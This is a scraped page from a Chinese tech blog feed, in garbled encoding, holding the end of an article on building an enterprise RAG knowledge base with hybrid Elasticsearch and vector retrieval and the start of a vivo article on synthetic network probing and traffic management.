rewrite_prompt = ChatPromptTemplate.from_messages([
    (<span class="hljs-string">"system"</span>, <span class="hljs-string">"æ ¹æ®å¯¹è¯å†å²ï¼Œå°†ç”¨æˆ·çš„ç®€çŸ­é—®é¢˜è¡¥å…¨ä¸ºå®Œæ•´çš„é—®é¢˜ã€‚"</span>),
    (<span class="hljs-string">"human"</span>, <span class="hljs-string">"å¯¹è¯å†å²ï¼š{history}\nå½“å‰é—®é¢˜ï¼š{question}"</span>)
])

llm = ChatAnthropic(model=<span class="hljs-string">"claude-sonnet-4-20250514"</span>)
rewrite_chain = rewrite_prompt | llm
</code></pre>
<h3 data-id="heading-14">4. å®Œæ•´æµç¨‹</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain.chains <span class="hljs-keyword">import</span> ConversationalRetrievalChain

<span class="hljs-comment"># æ„å»ºé—®ç­”é“¾</span>
qa_chain = ConversationalRetrievalChain.from_llm(
    llm=llm,
    retriever=ensemble_retriever,
    return_source_documents=<span class="hljs-literal">True</span>,
    verbose=<span class="hljs-literal">True</span>
)

<span class="hljs-comment"># æ‰§è¡ŒæŸ¥è¯¢</span>
result = qa_chain({
    <span class="hljs-string">"question"</span>: user_question,
    <span class="hljs-string">"chat_history"</span>: chat_history
})
</code></pre>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[ç”¨æˆ·æé—®] --&gt; B[æƒé™æ£€æŸ¥]
    B --&gt; C{æ˜¯å¦å¤šè½®?}
    C --&gt;|æ˜¯| D[LLMé‡å†™é—®é¢˜]
    C --&gt;|å¦| E[ä½¿ç”¨åŸé—®é¢˜]
    D --&gt; F[æ··åˆæ£€ç´¢]
    E --&gt; F
    F --&gt; G[æ–‡æ¡£æ’åº]
    G --&gt; H[LLMç”Ÿæˆç­”æ¡ˆ]
    H --&gt; I[è¿”å›ç»“æœ]
    
    style A fill:#e1f5ff
    style B fill:#ffe1e1
    style C fill:#fff4e1
    style D fill:#fff4e1
    style E fill:#e1ffe1
    style F fill:#ffe1f5
    style G fill:#ffe1f5
    style H fill:#fff4e1
    style I fill:#e1f5ff
</code></pre>
<h2 data-id="heading-15">å…«ã€å®é™…æ•ˆæœ</h2>
<p>ç³»ç»Ÿä¸Šçº¿ä¸‰ä¸ªæœˆåï¼Œæˆ‘ä»¬çœ‹äº†ä¸‹æ•°æ®ï¼š</p>
<p><strong>é—®ç­”å‡†ç¡®ç‡ï¼š</strong></p>
<ul>
<li>å•æ¬¡é—®ç­”ï¼š85%ä»¥ä¸Š</li>
<li>å¤šè½®å¯¹è¯ï¼š78%å·¦å³</li>
</ul>
<p><strong>å¬å›ç‡æå‡ï¼š</strong></p>
<ul>
<li>çº¯ESï¼š62%</li>
<li>çº¯å‘é‡ï¼š71%</li>
<li>æ··åˆæ£€ç´¢ï¼š89%</li>
</ul>
<p><strong>å…¸å‹æˆåŠŸæ¡ˆä¾‹ï¼š</strong></p>
<ol>
<li>"æŠ¥é”€éœ€è¦ä»€ä¹ˆå‘ç¥¨ï¼Ÿ" â†’ å‡†ç¡®æ‰¾åˆ°ã€Šå·®æ—…æŠ¥é”€åˆ¶åº¦ã€‹</li>
<li>"å¿˜è®°å¯†ç æ€ä¹ˆåŠï¼Ÿ" â†’ å‡†ç¡®æ‰¾åˆ°ã€ŠITè‡ªåŠ©æœåŠ¡æŒ‡å—ã€‹ï¼ˆå‘é‡ç†è§£è¯­ä¹‰ï¼‰</li>
<li>"HR-Linkç™»å½•åœ°å€ï¼Ÿ" â†’ ç²¾ç¡®åŒ¹é…å†…éƒ¨ç³»ç»Ÿæ–‡æ¡£ï¼ˆESç²¾ç¡®åŒ¹é…ï¼‰</li>
<li>"æˆ‘ç™»ä¸ä¸Šä»£ç å¹³å°" â†’ å‡†ç¡®æ‰¾åˆ°GitLabç›¸å…³æ–‡æ¡£ï¼ˆå‘é‡ç†è§£å£è¯­ï¼‰</li>
</ol>
<p><strong>å…¸å‹å¤±è´¥æ¡ˆä¾‹ï¼š</strong></p>
<ol>
<li>"èƒ½ä¸èƒ½æå‰æŠ¥é”€ï¼Ÿ" â†’ æ–‡æ¡£æ²¡æœ‰è¿™ä¸ªä¾‹å¤–æƒ…å†µ</li>
<li>"å»å¹´çš„åˆ¶åº¦æ˜¯æ€æ ·çš„ï¼Ÿ" â†’ æ—§ç‰ˆæœ¬æ–‡æ¡£è¢«é™æƒäº†</li>
</ol>
<h2 data-id="heading-16">ä¹ã€è¸©è¿‡çš„å‘</h2>
<h3 data-id="heading-17">å‘1ï¼šåˆ†å—å¤§å°</h3>
<p>æœ€å¼€å§‹æˆ‘ä»¬è®¾ç½®chunk_size=1000ï¼Œç»“æœå‘ç°å¾ˆå¤šé—®é¢˜åªéœ€è¦ä¸€å¥è¯å°±èƒ½å›ç­”ï¼Œä½†ç³»ç»Ÿè¿”å›äº†ä¸€å¤§æ®µæ— å…³å†…å®¹ã€‚</p>
<p>åæ¥æ”¹æˆ500ï¼Œæ•ˆæœå¥½å¤šäº†ã€‚</p>
<h3 data-id="heading-18">å‘2ï¼šå‘é‡æ¨¡å‹é€‰æ‹©</h3>
<p>ä¸€å¼€å§‹ç”¨çš„è‹±æ–‡æ¨¡å‹ï¼Œä¸­æ–‡æ•ˆæœå¾ˆå·®ã€‚åæ¥æ¢æˆBGEä¸­æ–‡æ¨¡å‹ï¼Œå‡†ç¡®ç‡ç›´æ¥æå‡20%ã€‚</p>
<h3 data-id="heading-19">å‘3ï¼šæƒé™è¿‡æ»¤çš„ä½ç½®</h3>
<p>æœ€å¼€å§‹æ˜¯æ£€ç´¢å®Œå†è¿‡æ»¤ï¼Œç»“æœå‘ç°å¯èƒ½æ£€ç´¢20æ¡ï¼Œè¿‡æ»¤ååªå‰©3æ¡ã€‚</p>
<p>æ”¹æˆæ£€ç´¢å‰å°±åŠ filterï¼Œé—®é¢˜è§£å†³ã€‚</p>
<h3 data-id="heading-20">å‘4ï¼šæ–‡æ¡£æ›´æ–°ä¸åŒæ­¥</h3>
<p>Elasticsearchæ›´æ–°äº†ï¼Œå‘é‡åº“æ²¡æ›´æ–°ï¼Œå¯¼è‡´è¿”å›çš„å†…å®¹ä¸ä¸€è‡´ã€‚</p>
<p>åæ¥åŠ äº†ç‰ˆæœ¬å·æœºåˆ¶ï¼Œå¼ºåˆ¶åŒæ­¥æ›´æ–°ã€‚</p>
<h2 data-id="heading-21">åã€æ€»ç»“</h2>
<p>å›è¿‡å¤´çœ‹ï¼Œæ•´ä¸ªæ–¹æ¡ˆçš„æ ¸å¿ƒå…¶å®å°±ä¸‰ç‚¹ï¼š</p>
<ol>
<li>
<p><strong>æ··åˆæ£€ç´¢è§£å†³äº†å•ä¸€æ–¹æ¡ˆçš„ç›²åŒº</strong></p>
<ul>
<li>ESä¿è¯ç²¾ç¡®åŒ¹é…</li>
<li>å‘é‡ä¿è¯è¯­ä¹‰ç†è§£</li>
</ul>
</li>
<li>
<p><strong>Queryé‡å†™è§£å†³äº†å¤šè½®å¯¹è¯é—®é¢˜</strong></p>
<ul>
<li>ä¸èƒ½ç®€å•åœ°ç”¨åŸå§‹é—®é¢˜æ£€ç´¢</li>
<li>éœ€è¦è¡¥å…¨ä¸Šä¸‹æ–‡</li>
</ul>
</li>
<li>
<p><strong>å…ƒæ•°æ®è¿‡æ»¤è§£å†³äº†æƒé™éš”ç¦»</strong></p>
<ul>
<li>æ£€ç´¢å‰å°±è¿‡æ»¤</li>
<li>ä¸æ˜¯ç”Ÿæˆæ—¶æ‰æ§åˆ¶</li>
</ul>
</li>
</ol>
<p>è¿™ä¸æ˜¯ä»€ä¹ˆé«˜æ·±çš„æŠ€æœ¯ï¼Œå°±æ˜¯é’ˆå¯¹çœŸå®ä¸šåŠ¡åœºæ™¯ï¼Œä¸€æ­¥æ­¥è§£å†³å®é™…é—®é¢˜ã€‚</p>
<p>æœ€é‡è¦çš„æ˜¯ï¼š<strong>ä¸è¦è¿·ä¿¡æŸä¸€ç§æ–¹æ¡ˆï¼Œè¦æ ¹æ®å®é™…æƒ…å†µç»„åˆä½¿ç”¨ã€‚</strong></p>
<p>å…³é”®è¯æ£€ç´¢å’Œå‘é‡æ£€ç´¢ï¼Œä¸æ˜¯æ›¿ä»£å…³ç³»ï¼Œè€Œæ˜¯äº’è¡¥å…³ç³»ã€‚</p>
<p>å¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½ç»™æ­£åœ¨åšä¼ä¸šçŸ¥è¯†åº“çš„åŒå­¦ä¸€äº›å‚è€ƒã€‚</p>
<p>å¦‚æœæœ‰é—®é¢˜ï¼Œæ¬¢è¿è®¨è®ºã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ™ºå–æµé‡ï¼Œæ•ˆèµ¢å¢é•¿-æ‹¨æµ‹å’Œèåˆæµé‡ç®¡ç†ä¸šåŠ¡èµ‹èƒ½å®è·µ]]></title>    <link>https://juejin.cn/post/7592440247957553167</link>    <guid>https://juejin.cn/post/7592440247957553167</guid>    <pubDate>2026-01-08T02:47:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592440247957553167" data-draft-id="7592439090097340459" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ™ºå–æµé‡ï¼Œæ•ˆèµ¢å¢é•¿-æ‹¨æµ‹å’Œèåˆæµé‡ç®¡ç†ä¸šåŠ¡èµ‹èƒ½å®è·µ"/> <meta itemprop="keywords" content="è¿ç»´"/> <meta itemprop="datePublished" content="2026-01-08T02:47:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="vivoäº’è”ç½‘æŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/993614243303053"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ™ºå–æµé‡ï¼Œæ•ˆèµ¢å¢é•¿-æ‹¨æµ‹å’Œèåˆæµé‡ç®¡ç†ä¸šåŠ¡èµ‹èƒ½å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614243303053/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    vivoäº’è”ç½‘æŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:47:55.000Z" title="Thu Jan 08 2026 02:47:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ä½œè€…ï¼šäº’è”ç½‘è¿ç»´æŠ€æœ¯ä¿éšœå›¢é˜Ÿ-Mo Hanã€Zhou Jianhua</p>
<p>åœ¨é£é€Ÿå‘å±•çš„äº’è”ç½‘ä¿¡æ¯åŒ–æ—¶ä»£ä¸‹ï¼ŒæŠ“ä½å¹¶å……åˆ†åˆ©ç”¨â€œæµé‡â€å°†ä¸ºä¸šåŠ¡å¢é•¿å¸¦æ¥â€œæ³¼å¤©â€å¯Œè´µï¼Œå·²æˆä¸ºå…±è¯†ã€‚å¦‚ä½•é€šè¿‡çœŸå®ã€æµ·é‡çš„æ•°æ®æ‰“é€ ä¸€ä¸ªé›†æˆæœ¬ã€è´¨é‡ã€æ•ˆç‡äºä¸€ä½“çš„èåˆæµé‡ç®¡ç†å¹³å°ï¼Œä¹Ÿæˆäº†å„è¡Œå„ä¸šçš„å…³æ³¨ç„¦ç‚¹ï¼Œæœ¬æ–‡é€šè¿‡â€æ‹¨æµ‹â€œä¸â€œèåˆæµé‡ç®¡ç†â€ä¸¤ä¸ªç»´åº¦ï¼Œæ¥åˆ†äº«vivoåœ¨æµé‡ç®¡ç†é¢†åŸŸçš„ä¸€äº›å®è·µå’Œæ¢ç´¢ã€‚</p>
<p>æœ¬æ–‡ä¸º2025å¹´ vivo å¼€å‘è€…å¤§ä¼šäº’è”ç½‘æŠ€æœ¯ä¸“åœºåˆ†äº«å†…å®¹ä¹‹ä¸€ï¼Œåœ¨å…¬ä¼—å·å¯¹è¯æ¡†å›å¤ã€2025VDCã€‘è·å– 2025VDC äº’è”ç½‘æŠ€æœ¯ä¼šåœºè®®é¢˜ç›¸å…³èµ„æ–™ã€‚</p>
</blockquote>
<p>1åˆ†é’Ÿçœ‹å›¾æŒæ¡æ ¸å¿ƒè§‚ç‚¹ğŸ‘‡</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a9d5bed5a8c4074875672aff62bc2f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=XIm507uvbSefqtJMdp4t0k9XNdQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/909a762cf82248b6840ae5d88d3ea795~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=Yn4323KpY4bLZwTjzUaOPTtJlWU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><em>å›¾1 VS å›¾2ï¼Œæ‚¨æ›´å€¾å‘äºå“ªå¼ å›¾æ¥è¾…åŠ©ç†è§£å…¨æ–‡å‘¢ï¼Ÿ</em></p>
<h2 data-id="heading-0">ä¸€ã€èƒŒæ™¯</h2>
<p>åœ¨é£é€Ÿå‘å±•çš„äº’è”ç½‘ä¿¡æ¯åŒ–æ—¶ä»£ä¸‹ï¼ŒæŠ“ä½å¹¶å……åˆ†åˆ©ç”¨â€œæµé‡â€å°†ä¸ºä¸šåŠ¡å¢é•¿å¸¦æ¥â€œæ³¼å¤©â€å¯Œè´µï¼Œå·²æˆä¸ºå…±è¯†ã€‚å¦‚ä½•é€šè¿‡çœŸå®ã€æµ·é‡çš„æ•°æ®æ‰“é€ ä¸€ä¸ªé›†æˆæœ¬ã€è´¨é‡ã€æ•ˆç‡äºä¸€ä½“çš„èåˆæµé‡ç®¡ç†å¹³å°ï¼Œä¹Ÿæˆäº†å„è¡Œå„ä¸šçš„å…³æ³¨ç„¦ç‚¹ï¼Œæœ¬æ–‡é€šè¿‡â€œæ‹¨æµ‹â€ä¸â€œèåˆæµé‡ç®¡ç†â€ä¸¤ä¸ªç»´åº¦ï¼Œæ¥åˆ†äº«vivoåœ¨æµé‡ç®¡ç†é¢†åŸŸçš„ä¸€äº›å®è·µå’Œæ¢ç´¢ã€‚</p>
<h2 data-id="heading-1">äºŒã€å…¨çƒæ‹¨æµ‹</h2>
<h3 data-id="heading-2">2.1 ä»€ä¹ˆæ˜¯æ‹¨æµ‹</h3>
<p>ç®€å•æ¥è¯´ï¼Œæ‹¨æµ‹å°±æ˜¯ä¸€å¥—æ¨¡æ‹ŸçœŸå®ç”¨æˆ·è¡Œä¸ºï¼Œä¸»åŠ¨è¿›è¡Œå¥åº·æ£€æŸ¥å’Œæ€§èƒ½æµ‹é‡çš„æ—è·¯ç›‘æ§ç³»ç»Ÿã€‚ å®ƒå°±åƒæˆ‘ä»¬æ´¾å‡ºå»çš„æ— æ•°â€œè§‚å¯Ÿè€…â€ï¼Œé€šè¿‡è¿™äº›â€œè§‚å¯Ÿè€…â€ï¼Œæˆ‘ä»¬ä¸»è¦å¯ä»¥å®ç°ä¸‰å¤§ç›®æ ‡ï¼š</p>
<p>**ä¸€æ˜¯æ€§èƒ½ç›‘æ§ï¼š**å®ƒå¯ä»¥æ¨¡æ‹Ÿç”¨æˆ·å¯¹æŸä¸ªç½‘ç»œæ¥å£æˆ–è€…ç½‘å€ï¼Œå‘èµ·ä¸»åŠ¨æ¢æµ‹ï¼Œæ£€æµ‹ç½‘ç»œçš„å»¶è¿Ÿã€ä¸¢åŒ…ï¼Œé”™è¯¯ï¼ŒåŠæ—¶å‘ç°ç½‘ç»œé£é™©å’Œæ•…éšœã€‚</p>
<p>**äºŒæ˜¯äº§å“ä¼˜åŒ–ï¼š**ä»ç”¨æˆ·è§†è§’å»å¯¹æ¯”ä¸åŒç‰ˆæœ¬çš„æ€§èƒ½å·®å¼‚ï¼Œä¸ºäº§å“è¿­ä»£æä¾›æ•°æ®æ”¯æŒã€‚</p>
<p>**ä¸‰æ˜¯å¯ç”¨æ€§ç›‘æ§ï¼š**æ¨¡æ‹Ÿç”¨æˆ·ä½¿ç”¨ä¸šåŠ¡åœºæ™¯å’Œå®Œæ•´æµç¨‹ï¼Œè¯„ä¼°ä¸šåŠ¡çš„çœŸå®è´¨é‡ï¼ŒåŠæ—¶å‘ç°ä¸šåŠ¡å¯ç”¨æ€§é—®é¢˜ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/91db14914c1b4bed9a23b141c1550689~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=ymWk6qKGdF8%2BI90bUOpHYY7ilWo%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-3">2.2 vivoæ‹¨æµ‹å¹³å°ä»‹ç»</h3>
<p>åœ¨vivoï¼Œæ‹¨æµ‹çš„æ ¸å¿ƒä½¿å‘½ï¼Œå°±æ˜¯ä¸ºæ‰€æœ‰ä¸šåŠ¡å’Œäº§å“é«˜å¯ç”¨ä¿é©¾æŠ¤èˆªï¼Œç½‘ç»œæ€§èƒ½ç›‘æ§ã€ä¸šåŠ¡å¯ç”¨æ€§ç›‘æ§ï¼Œäº§å“ä¼˜åŒ–åˆ†æã€è¿™æ˜¯åŸºç¡€èƒ½åŠ›ï¼Œç¡®ä¿æˆ‘ä»¬çš„æœåŠ¡ç¨³å®šå¯é ã€‚</p>
<p>åœ¨è¿™åŸºç¡€èƒ½åŠ›ä¹‹ä¸Šä»¥åŠç»“åˆæœ¬æ¬¡åˆ†äº«çš„ä¸»é¢˜ï¼Œæˆ‘ä»¬å­µåŒ–äº†å¦å¤–ä¸€ç§åœºæ™¯-â€œç½‘ç»œè°ƒåº¦æ£€æµ‹â€ï¼Œæˆ‘ä»¬ä¼šæŒç»­åœ°å¯¹CDNã€æœºæˆ¿ã€è¿è¥å•†è¿™äº›åŸºç¡€é“¾è·¯è¿›è¡Œæ¢æµ‹å’Œåˆ†æï¼Œä¸€æ—¦å‘ç°é—®é¢˜ï¼Œå°±å¯ä»¥åŸºäºæ‹¨æµ‹æ•°æ®åŠ¨æ€è°ƒæ•´ç½‘ç»œç­–ç•¥ï¼Œä»¥å®ç°æµé‡å’Œæ•…éšœæ™ºèƒ½è°ƒåº¦ç›®çš„ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0e50b7897fb543898a0ab768e8b1a0a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=Lgbow8T8uIvEUvUAM6TBJTeXpts%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-4">2.3 vivoæ‹¨æµ‹çš„åŸç†ä»‹ç»</h3>
<p>äº†è§£äº†vivoè‡ªæœ‰èŠ‚ç‚¹è§„æ¨¡åï¼Œé‚£ä¹ˆæ‹¨æµ‹å¦‚ä½•å·¥ä½œçš„ï¼Ÿä¸‹é¢è¿™å¼ å›¾æ¸…æ™°å±•ç¤ºäº†vivoæ‹¨æµ‹ç³»ç»Ÿçš„åŸºæœ¬å·¥ä½œåŸç†ï¼Œå®ƒä¸»è¦åˆ†ä¸ºä¸‰æ­¥ï¼š</p>
<p><strong>ç¬¬ä¸€æ­¥ï¼Œä¸‹å‘æ‰§è¡Œæ¢æµ‹ä»»åŠ¡ã€‚</strong></p>
<p>å¹³å°ä¼šå‘åˆ†å¸ƒåœ¨å…¨çƒçš„è¾¹ç¼˜æ¢æµ‹èŠ‚ç‚¹ï¼Œä¸‹å‘æ¢æµ‹æŒ‡ä»¤ï¼Œæ¯”å¦‚å»è®¿é—®æŸä¸ªç½‘å€ï¼Œæˆ–è€…è®¿é—®æŸä¸€æ¥å£ï¼Œä¹Ÿæˆ–è€…ä¸‹è½½æŸä¸ªAPPç­‰ã€‚</p>
<p><strong>ç¬¬äºŒæ­¥ï¼Œæ•°æ®é‡‡é›†ä¸åˆ†æã€‚</strong></p>
<p>èŠ‚ç‚¹åœ¨æ‰§è¡Œä»»åŠ¡æ—¶ï¼Œä¼šæ”¶é›†ç½‘ç»œä¸¢åŒ…ç‡ï¼Œå“åº”æ—¶é—´ã€å¯ç”¨æ€§ç­‰æ€§èƒ½æ•°æ®ï¼Œå¹¶è¿›è¡Œå®æ—¶åˆ†æã€‚</p>
<p><strong>ç¬¬ä¸‰æ­¥ï¼Œé˜ˆå€¼å’Œå¯ç”¨æ€§å‘Šè­¦ã€‚</strong></p>
<p>å¦‚æœå‘ç°æ¢æµ‹ç»“æœè¶…å‡ºäº†æˆ‘ä»¬è®¾å®šçš„é˜ˆå€¼ï¼Œæ¯”å¦‚è®¿é—®è¶…æ—¶ã€ä¸å¯ç”¨ï¼Œæ£€æµ‹å‘Šè­¦ç³»ç»Ÿå°±ä¼šç«‹å³è§¦å‘å‘Šè­¦ï¼Œå¹¶å¯ä»¥è”åŠ¨ æ™ºèƒ½è°ƒåº¦ç­–ç•¥ è¿›è¡Œè‡ªåŠ¨å¤„ç†ï¼Œæ¯”å¦‚åˆ‡æ¢çº¿è·¯ï¼Œåˆ‡æ¢ç¾å¤‡æœºæˆ¿ï¼Œåˆ‡æ¢è¿è¥å•†ç­‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e89eaf89242e46debd394e817c63ee36~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=OEFNevR5wIwDSKR%2FNHxvmCHiBMs%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-5">2.4 vivoæ‹¨æµ‹èƒ½åŠ›ä»‹ç»-é‡‡é›†ä¾§</h3>
<p>ä¸ºäº†ç®¡ç†å¦‚æ­¤åºå¤§çš„èŠ‚ç‚¹ç½‘ç»œå¹¶æ‰§è¡Œå¤æ‚çš„ä»»åŠ¡ï¼Œæˆ‘ä»¬çš„æ‹¨æµ‹å¹³å°æ„å»ºå“ªäº›æŠ€æœ¯èƒ½åŠ›å‘¢ï¼Ÿå¤§å®¶å¯ä»¥çœ‹ä¸‹é¢è¿™å¼ æ¶æ„å›¾ï¼Œ</p>
<p>é¦–å…ˆã€åœ¨é‡‡é›†ä¾§ï¼Œæˆ‘ä»¬å…·å¤‡äº†ä»åº•å±‚çš„DNSè§£æã€TCPå»ºè”ï¼Œåˆ°ä¸Šå±‚çš„HTTPå¯ç”¨æ€§ã€ç§æœ‰åè®®ï¼Œå†åˆ°ç½‘é¡µé¦–å±ã€æµåª’ä½“ç­‰å…¨æ–¹ä½çš„ç”¨æˆ·ä½“éªŒæ£€æµ‹èƒ½åŠ›ã€‚</p>
